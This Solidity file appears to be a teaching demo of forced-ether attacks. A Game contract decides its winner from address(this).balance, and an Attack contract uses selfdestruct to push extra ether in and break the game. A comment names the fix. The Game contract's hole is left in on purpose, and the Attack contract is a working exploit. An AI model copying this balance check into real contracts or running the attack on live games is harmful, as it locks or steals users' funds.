// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10; 



// forcefully sending ether to other smart contract and destructing your smart contract

contract A 
{
      function getbalance() public view returns(uint256)
      {
          return address(this).balance;
      }
}

contract B 
{

    function send(address payable addr) public payable
    {
        selfdestruct(addr);
    }

}


contract Game
{
  
   uint256 constant public AmountOfEther  = 7 ether;
   address public winner ;
  // uint256 public balance ;
   function deposit() public payable
   {
     require(msg.value == 1 ether , "send exactly one ether ");
     uint256 balance =  address(this).balance; // if we put balance += msg.value then the problem is solved 
     require(balance<=AmountOfEther,"balance exceeded");

     if(balance == AmountOfEther)
     {
         winner = msg.sender;
     }
   } 

   function claimreward() public
   {
    require(msg.sender == winner , "only winner can claim the reward");
    (bool result , ) = payable(winner).call{value: AmountOfEther}("");
    require(result,"Ether Failed to Send");
   }


   function getbalance() public view returns (uint256)
   {
       return address(this).balance;
   }
  


}


contract Attack
{

   function attack(address payable addr) public payable
   {
        selfdestruct(addr);
   }

}
